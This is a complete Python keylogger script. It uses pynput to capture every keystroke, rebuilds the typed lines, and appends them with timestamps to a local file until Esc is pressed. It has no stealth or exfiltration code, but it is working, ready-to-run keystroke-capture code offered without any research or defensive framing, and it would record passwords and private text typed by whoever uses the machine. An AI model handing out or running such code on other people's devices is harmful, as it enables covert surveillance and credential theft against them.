from pynput import keyboard
from datetime import datetime

log_file = "key_log.txt"
current_text = ""

def write_log(text):
    with open(log_file, "a") as f:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"\n[{timestamp}] {text}\n")

def on_press(key):
    global current_text
    try:
        current_text += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            current_text += " "
        elif key == keyboard.Key.enter:
            write_log(current_text)  # Save when Enter is pressed
            current_text = ""
        elif key == keyboard.Key.backspace:
            current_text = current_text[:-1]
        else:
            pass

# Save unsaved text if script is stopped
def on_release(key):
    if key == keyboard.Key.esc:
        if current_text:
            write_log(current_text)
        return False  # Stop listener

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
